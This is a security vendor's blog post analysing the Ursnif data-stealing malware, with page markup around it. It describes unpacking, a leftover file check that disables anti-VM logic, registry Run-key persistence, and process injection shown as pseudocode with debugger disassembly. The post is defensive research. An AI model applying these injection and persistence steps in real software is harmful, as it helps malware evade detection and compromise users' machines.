<!doctype html><!-- start coded_template: id:3368679407 path:generated_layouts/3368679387.html --><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en">        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en">               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Ariel Koren">
    <meta name="description" content="Ursnif">
    <meta name="generator" content="HubSpot">
    <title>Ursnif: Deep Technical Dive</title>
    <link rel="shortcut icon" href="http://info.seculert.com/hs-fs/hub/237610/file-2170643530-png/New_Logos/Favicon/favicon.png?t=1475190447323">

    
    
    <script src="https://static.hsstatic.net/jquery-libs/static-1.1/jquery/jquery-1.7.1.js"></script>
    <script type="text/javascript">hsjQuery = window['jQuery']</script>
    <link href="https://static.hsstatic.net/content_shared_assets/static-1.4020/css/public_common.css" rel="stylesheet">
    <meta property="og:description" content="Ursnif">
    <meta property="og:title" content="Ursnif: Deep Technical Dive">
    <meta name="twitter:description" content="Ursnif">
    <meta name="twitter:title" content="Ursnif: Deep Technical Dive">


    
    

    
<!--  Added by GoogleAnalytics integration -->

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-18853661-2', 'auto');
  ga('send', 'pageview');
</script>

<!-- /Added by GoogleAnalytics integration -->

    


    <!--[if lt IE 9]>
    <script src="https://static.hsstatic.net/content_shared_assets/static-1.4020/js/css3-mediaqueries.js"></script>
    <![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1">

<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic,600,600italic,700" rel="stylesheet" type="text/css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.1/js/materialize.min.js"></script>
<script src="//cdn2.hubspot.net/hub/237610/hub_generated/template_assets/1461813004010/custom/page/NewSeculertJavascripts/init.min.js"></script>
<script src="//cdn2.hubspot.net/hub/237610/hub_generated/style_manager/1444641212357/custom/page/NewSeculertJavascripts/autodemo.min.js"></script>
<script type="text/javascript" language="javascript"> 
      var sf14gv = 24181; 
      (function() { 
      var sf14g = document.createElement('script'); sf14g.type = 'text/javascript'; sf14g.async = true; 
      sf14g.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 't.sf14g.com/sf14g.js'; 
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(sf14g, s); 
      })(); 
</script>
<meta property="og:image" content="http://www.seculert.com/hubfs/Figure_1.png#keepProtocol">
<meta name="twitter:image" content="http://www.seculert.com/hubfs/Figure_1.png#keepProtocol">

<meta property="og:url" content="http://www.seculert.com/blogs/ursnif-deep-technical-dive">

<link rel="canonical" href="http://www.seculert.com/blogs/ursnif-deep-technical-dive">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="http://www.seculert.com/blogs/rss.xml">
<meta name="twitter:card" content="summary">
<meta name="twitter:domain" content="www.seculert.com">
<meta name="twitter:site" content="@seculert">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<link href="//cdn2.hubspot.net/hub/-1/hub_generated/style_manager/1472825336927/hubspot_default/shared/responsive/layout.min.css" rel="stylesheet">


<link rel="stylesheet" href="//cdn2.hubspot.net/hub/237610/hub_generated/template_assets/1475373827989/custom/page/basic/NewSeculertMaterializeStylesheet.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/237610/hub_generated/template_assets/1461829987651/custom/email/basic/NewSeculertStylesheet.min.css">


    <!-- The style tag has been deprecated. Attached stylesheets are included in the required_head_tags page variable. -->


</head>
<body class="   hs-content-id-4320511992 hs-blog-post hs-content-path-blogs-ursnif-deep-technical-dive hs-content-name-ursnif-deep-technical-dive hs-blog-name-blogs hs-blog-id-294026020" style="">
    <div class="header-container-wrapper">
    <div class="header-container container-fluid">


    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

        <div class="row-fluid-wrapper row-depth-1 row-number-1 ">
        <div class="row-fluid ">
            <div class="span12 widget-span widget-type-global_widget " style="" data-widget-type="global_widget" data-x="0" data-w="12">
                <div class="cell-wrapper layout-widget-wrapper">
                    <span id="hs_cos_wrapper_newseculert_menu" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_raw_html" style="" data-hs-cos-general-type="widget" data-hs-cos-type="raw_html" data-global-widget-id="3324262294"><div class="navbar-fixed">
  <nav class="an-transparent" role="navigation">
    <div class="nav-wrapper container">
      <a id="logo-container" href="/home-page" class="brand-logo"><img src="/hubfs/NewSeculertImages/logo-seculert.png" alt=""></a>
          <ul class="an-sub-link right hide-on-med-and-down">
            <li><a href="/blogs" title="Blog" class="btn-flat bnt-cutom-flat">Blog</a></li>
            <li><a class="waves-effect waves-light btn" title="Contact Us" href="/new-contact">Contact Us</a></li>
          </ul>  
           <div class="clearfix"></div>
          <ul id="coolMenu" class="right hide-on-med-and-down an-coolMenu">
           <li>
            <a href="/solutions" linkhref="solutions">solutions</a>
            <ul class="noJS">
                <li><a href="/solutions#Seculert_Javelin">Seculert Javelin</a></li>
                <li><a href="/solutions#Seculert_Shield">Seculert Shield</a></li>
                <li><a href="/solutions#How_It_Works">How It Works</a></li>
                
            </ul>
        </li>
        <li>
            <a href="/why-seculert" linkhref="why-seculert">why seculert?</a>
            <ul class="noJS">
                <li><a href="/why-seculert#why_seculert">Why Seculert</a></li>
                <li><a href="/why-seculert#our_approach">Our Approach</a></li>
                <li><a href="/why-seculert#technology">Technology</a></li>
            </ul>
        </li>
    	<li><a href="/customer-page" linkhref="customer-page">customers</a></li>
        <li><a href="/partners" linkhref="partners">partners</a></li>
        <li>
            <a href="/resources-page" linkhref="resources-page">resources</a>
            <ul class="noJS">
                <li><a href="/resources-page#data_sheet">Data Sheets</a></li>
                <li><a href="/resources-page#white_paper">White Papers</a></li>
                <li><a href="/resources-page#webinar">Webinars</a></li>
                <li><a href="/resources-page#report">Reports</a></li>
            </ul>
        </li>
		<li>
           <a href="/company" linkhref="company">company</a>
           <ul class="noJS">
                <li><a href="/company#about_us">About Us</a></li>
                <li><a href="/company#news_events">PR &amp; News</a></li>
                <li><a href="/company#research">Research</a></li>
                <li><a href="/company#management_team">Leadership</a></li>
                <li><a href="/company#career">Careers</a></li>
                
            </ul>
        </li>
      </ul>
        
      <ul id="nav-mobile" class="side-nav">
        <li class="no-padding">
          <ul class="collapsible" data-collapsible="accordion">
            <li><a class="collapsible-header">solutions <i class="fa fa-fw"></i></a>
              <div class="collapsible-body">
                <ul>
                    <li><a href="/solutions#Seculert_Javelin">Seculert Javelin</a></li>
                    <li><a href="/solutions#Seculert_Shield">Seculert Shield</a></li>
                    <li><a href="/solutions#How_it_Works">How it Works</a></li>

                </ul>
              </div>
            </li>
          </ul>
        </li>
		<li class="no-padding">
          <ul class="collapsible" data-collapsible="accordion">
            <li><a class="collapsible-header">why seculert? <i class="fa fa-fw"></i></a>
              <div class="collapsible-body">
                <ul>
                    <li><a href="/why-seculert#why_seculert">Why Seculert</a></li>
                    <li><a href="/why-seculert#our_approach">Our Approach</a></li>
                    <li><a href="/why-seculert#technology">Technology</a></li>
                </ul>
              </div>
            </li>
          </ul>
        </li>
		<li><a href="/customer-page">customers</a></li>
        <li><a href="/partners">partners</a></li>
        <li class="no-padding">
          <ul class="collapsible" data-collapsible="accordion">
            <li><a class="collapsible-header">resources <i class="fa fa-fw"></i></a>
              <div class="collapsible-body">
                <ul>
                    <li><a href="/resources-page#data_sheet">Data Sheets</a></li>
                    <li><a href="/resources-page#white_paper">White Papers</a></li>
                    <li><a href="/resources-page#webinar">Webinars</a></li>
                    <li><a href="/resources-page#report">Reports</a></li>
                </ul>
              </div>
            </li>
          </ul>
        </li>
        <li class="no-padding">
          <ul class="collapsible" data-collapsible="accordion">
            <li><a class="collapsible-header">company <i class="fa fa-fw"></i></a>
              <div class="collapsible-body">
                <ul>
                    <li><a href="/company#about_us">About Us</a></li>
                    <li><a href="/company#news_events">PR &amp; News</a></li>
                    <li><a href="/company#research">Research</a></li>
                    <li><a href="/company#management_team">Leadership</a></li>
                    <li><a href="/company#career">Careers</a></li>
                </ul>
              </div>
            </li>
          </ul>
        </li>
        <li><a href="/blogs" title="Blogs">Blogss</a></li>
        <li><a href="/new-contact" title="Contact Us">Contact Us</a></li>
      </ul>
      <a href="#" data-activates="nav-mobile" class="button-collapse">menu<i class="material-icons"></i></a>
    </div>
  </nav>
</div></span>
                </div><!--end layout-widget-wrapper -->
            </div><!--end widget-span -->
        </div><!--end row-->
        </div><!--end row-wrapper -->
        <div class="row-fluid-wrapper row-depth-1 row-number-2 ">
        <div class="row-fluid ">
            <div class="span12 widget-span widget-type-raw_html " style="" data-widget-type="raw_html" data-x="0" data-w="12">
                <div class="cell-wrapper layout-widget-wrapper">
                    <span id="hs_cos_wrapper_module_14430704855787658" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_raw_html" style="" data-hs-cos-general-type="widget" data-hs-cos-type="raw_html"><div class="an-content-header-blog">
<div id="index-banner" class="parallax-container">
<div class="section no-pad-bot">
<div class="container">
<h5 class="header center col s12">latest insights</h5>
<h2 class="header center">seculert blog</h2>
</div>
</div>
<div class="parallax"><img src="http://www.seculert.com/hubfs/NewSeculertImages/background2.png?t=1475190447323" alt="Unsplashed background img 1"></div>
</div>
</div></span>
                </div><!--end layout-widget-wrapper -->
            </div><!--end widget-span -->
        </div><!--end row-->
        </div><!--end row-wrapper -->
        <div class="row-fluid-wrapper row-depth-1 row-number-3 ">
        <div class="row-fluid ">
            <div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

                <div class="row-fluid-wrapper row-depth-1 row-number-4 ">
                <div class="row-fluid ">
                    <div class="span12 widget-span widget-type-blog_content " style="" data-widget-type="blog_content" data-x="0" data-w="12">
<div class="container">
     <div class="an-content-section">
         <div class="row">
            <div class="col s12 m8 l9 an-content-left">
                 <div class="an-item-blog an-item-blog-detail">
                    
                    <h3><a href="http://www.seculert.com/blogs/ursnif-deep-technical-dive" title=""><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Ursnif: Deep Technical Dive</span></a></h3>
                    <div class="an-group-link">
                        <span>by Ariel Koren</span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                        <span>Aug 30, 2016 4:23:13 PM</span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                        
                        
                        <span>0 Comments</span>
                    </div> 
                    <p>
                        <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"></span></p><p><span style="color: #333333;">While attack tools around the world are stealthy and stay under the radar, we at Seculert examine many different malicious tools. This is done to stay at least one step ahead of the attackers, and improve our advanced analytics technology to detect their artistic evasive techniques.</span></p>
<!--more-->
<table>
<tbody>
<tr>
<td>
<p><span style="color: #333333;">In this blog I explain some of the core methods an attack tool named Ursnif uses, as well as mention some, probably unintentional, pieces of code that were left behind in the production version of the malware.</span></p>
<p><span style="color: #333333;">Ursnif is a data stealer and a downloader with a lot of abilities to steal data from installed browsers and other applications (such as Microsoft Outlook).</span></p>
</td>
<td>
<p><img src="http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=1024&amp;name=URSNIF-Severe-msft.png" alt="URSNIF-Severe-msft.png" width="1024" style="width: 1024px; margin: 0px;" srcset="http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=512&amp;name=URSNIF-Severe-msft.png 512w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=1024&amp;name=URSNIF-Severe-msft.png 1024w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=1536&amp;name=URSNIF-Severe-msft.png 1536w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=2048&amp;name=URSNIF-Severe-msft.png 2048w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=2560&amp;name=URSNIF-Severe-msft.png 2560w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=3072&amp;name=URSNIF-Severe-msft.png 3072w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<span style="font-size: 9px;">Image:&nbsp;<a href="https://www.microsoft.com">https://www.microsoft.com</a>&nbsp;(Win32/Ursnif)&nbsp;</span></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">In addition to stealing data, Ursnif also has the ability to download additional malicious components from the attacker’s Command &amp; Control (C&amp;C) servers and load them dynamically into memory. In this version of Ursnif I have also encountered an internal peer-to-peer communication which could possibly add the ability for the sample to communicate with other Ursnif peers over the same network. We will discuss the peer-to-peer part in a future blog post.</span></p>
<p><span style="color: #333333;"><strong><u>It All Begins With An Executable</u></strong></span><br><span style="color: #333333;">When the Ursnif executable is first loaded, it will unpack the real payload. The real payload is packed by the attackers, because it helps keeping it undetected by security solutions which are based on a file signature.<br><br></span><span style="color: #333333;">After the real payload is unpacked, it will run in a hollowed process, and even at that stage of unpacking, the&nbsp;<a href="https://en.wikipedia.org/wiki/Data_segment" target="_blank" style="color: #333333; text-decoration: underline;">.</a><span style="text-decoration: underline;"><span><a href="https://en.wikipedia.org/wiki/Data_segment" target="_blank" style="color: #333333; text-decoration: underline;">BSS section</a></span></span> is still obfuscated and will be de-xored on runtime before the malware will continue with the execution.</span></p>
<p style="text-align: center;"><span style="font-size: 11px; color: #333333;"></span><a href="http://www.seculert.com/hubfs/Figure_1.jpg?t=1475190447323" rel="nofollow" data-mce-rel="nofollow"><img src="http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=640&amp;name=Figure_1.jpg" alt="The bss section before and after dexoring it" width="640" title="The bss section before and after dexoring it" caption="false" data-constrained="false" style="width: 640px; margin: 0px;" srcset="http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=320&amp;name=Figure_1.jpg 320w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=640&amp;name=Figure_1.jpg 640w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=960&amp;name=Figure_1.jpg 960w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=1280&amp;name=Figure_1.jpg 1280w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=1600&amp;name=Figure_1.jpg 1600w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=1920&amp;name=Figure_1.jpg 1920w" sizes="(max-width: 640px) 100vw, 640px"></a>&nbsp;<br><span style="color: #808080;">The bss section before and after dexoring it</span></p>
<p><span style="color: #333333;">Afterward, there is a simple check the malware authors left behind. If the file C:\321.txt exists, the checks for a virtualized environment are ignored. This was most probably developed in order to allow the attackers to test their tool on their own virtualized machines. Even though it is quite funny that the attackers left this piece of code in a production compilation, it might show how careless they are. Basically, if anyone else would like to test Ursnif on a virtual machine, they can just create a file with that name at that location and the malware will work properly with no need to change the virtual machine's configurations.<br>Next, the malware will make sure that all of the users on the machine are infected, by enumerating the registry root key HKU and for each user key, it will put an appropriate startup value, as well as the payload on each AppData folder of each user. Registry Keys used:</span></p>
<p><span style="color: #333333;">• HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Run\</span><br><span style="color: #333333;">• HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\<strong>AppData</strong></span><span style="color: #333333;">&nbsp; &nbsp;<br></span><span style="color: #333333;">&nbsp; &nbsp; ○ (Value equals the folder to be used for the malware, for example: &nbsp; <br>&nbsp; &nbsp; &nbsp; &nbsp; C:\Users\Administrator\Appdata\Roaming\")<br></span></p>
<p><span style="color: #333333;"> After this procedure, we move on to the injection method.</span></p>
<p><span style="color: #333333;"><strong><u>And It Continues With Another Executable To Be Injected</u></strong></span><br><span style="color: #333333;">In the second part, the malware will look for a legitimate process to run in its context. Running in a different process context allows the malware to bypass firewall rules which let some processes through without alerting or blocking them.</span></p>
<p><span style="color: #333333;">Internally, the malware calculates a unique checksum for each process name it finds, in order to obfuscate the processes into which it will try to inject itself. Instead of injecting to `explorer.exe` for example, a checksum will be calculated, resulting in something like 0x17F9B5AA. Then, it will check if that value matches a value from an internal list of checksums, and only if it exists in that list, it will begin the injection method on that process.&nbsp;<br><br>Let's examine a <strong>pseudo code</strong> (as simple as possible) of how the first part of the injection looks:</span></p>
<table style="border-color: #808080; width: 100%; margin-left: auto; margin-right: auto; background-color: #e6e6e6;" cellspacing="15" cellpadding="15">
<tbody>
<tr>
<td><span style="color: #008000;">/* Obtain the process pid to inject to */</span><br>dwPID = <span style="color: #0000ff;">GetInjectProcess</span>()<br><br>hProcess = <span style="color: #0000ff;">OpenProcess</span>(dwPID, ...)<br>pAddress = <span style="color: #0000ff;">GetProcAddress</span>(<span style="color: #ff9900;">"ntdll.dll"</span>, <span style="color: #ff9900;">"RtlExitUserThread"</span>)<br><br><span style="color: #008000;">/* Create remote thread in suspended mode */</span><br>hThread = <span style="color: #0000ff;">CreateRemoteThread</span>(hProcess,<span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* Remote process handle */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <span style="color: #800080;">CREATE_SUSPENDED</span>, &nbsp;<span style="color: #008000;">/* creation flags */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pAddress, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* thread function address */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...)<br><br><span style="color: #008000;">/* Read remote procedure first four bytes */</span><br>dwBackupData = <span style="color: #0000ff;">ZwReadVirtualMemory</span>(hProcess, &nbsp;<span style="color: #008000;">/* Remote process handle */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pAddress, &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #008000;">/* Address to read */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* number of bytes to read */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...)<br><br><span style="color: #008000;">/* Change address protection to `writable` */</span><br><span style="color: #0000ff;">VirtualProtectEx</span>( &nbsp; hProcess, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #008000;">/* Remote process handle */</span><br><span style="color: #800080;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ_WRITE_EXECUTE</span>, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* New protection flags */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pAddress, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* Address to change protection on */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #008000;">/* Size of address */</span><br>...)<br><br><br><span style="color: #0000ff;">ZwWriteVirtualMemory</span>(hProcess,&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #008000;">/* Remote process handle */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pAddress,<span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Address to overwrite */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xCCCCFEEB,<span style="color: #008000;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Data to write */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* Size of data */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...)</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<ul>
<li>Open a handle to the desired process.</li>
<li>Get the address of ntdll!RtlExitUserThread function.</li>
<li>Create a remote suspended thread with the appropriate function.</li>
<li>Obtain the first four bytes of the function as a backup (because in the upcoming steps, they will be overwritten).</li>
<li>Before we overwrite the bytes, we must change the protection flags of the memory so it will be writable.</li>
<li>Write four bytes (DWORD)(0xCCCCFEEB). This is the interesting part, changing the original function prologue this way, will result in an infinite loop.</li>
</ul>
<p>Let's examine the function before and after the changes:</p>
<table style="width: 100%; border-color: #000000; margin-left: auto; margin-right: auto; background-color: #e6e6e6;" border="1">
<tbody>
<tr>
<td style="width: 44.9592%; text-align: left;" rowspan="2">
<p style="text-align: center;">Before</p>
<p style="line-height: 1em;">ntdll!RtlExitUserThread:<br>77dc1000 <strong>8bff</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; edi,edi<br>77dc1002 <strong>55</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; ebp<br>77dc1003 <strong>8b</strong>ec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ebp,esp<br>77dc1005 83e4f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; esp,0FFFFFFF8h<br>77dc1008 81ecbc000000&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; esp,0BCh</p>
</td>
<td style="width: 50.0408%; text-align: left;" rowspan="2">
<p style="text-align: center;">After</p>
<p style="line-height: 1em;">ntdll!RtlExitUserThread:<br>77dc1000 <strong>ebfe</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; ntdll!RtlExitUserThread (77dc1000)<br>77dc1002 <strong>cc</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 3<br>77dc1003 <strong>cc</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 3<br>77dc1004 ec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; in&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,dx<br>77dc1005 83e4f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; esp,0FFFFFFF8h<br>77dc1008 81ecbc000000&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; esp,0BCh</p>
</td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">After the change, the new values assigned to the function prologue are translated to JMP &lt;Short&gt;, which is a two byte opcode. The first byte (0xEB) is what translated the processor to recognize it as a JMP opcode, and it will also expect the second byte to be the value of where to jump to (Relatively from the EIP at the end of the opcode). The second byte we have in this scenario is 0xFE, which translates to (-2). Jumping relatively from the end of the opcode (address 0x77dc1002) -2 bytes, will make the EIP get back to address 0x77dc1000, which is the same opcode again. This will result an infinite loop of one opcode. as you can see WinDBG translates it beautifully:&nbsp;</span></p>
<table style="border-color: #000000; width: 100%; margin-left: auto; margin-right: auto; background-color: #e6e6e6;">
<tbody>
<tr>
<td style="text-align: left;"><strong>77dc1000</strong><span> ebfe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; ntdll!RtlExitUserThread </span><strong>(77dc1000)</strong></td>
</tr>
</tbody>
</table>
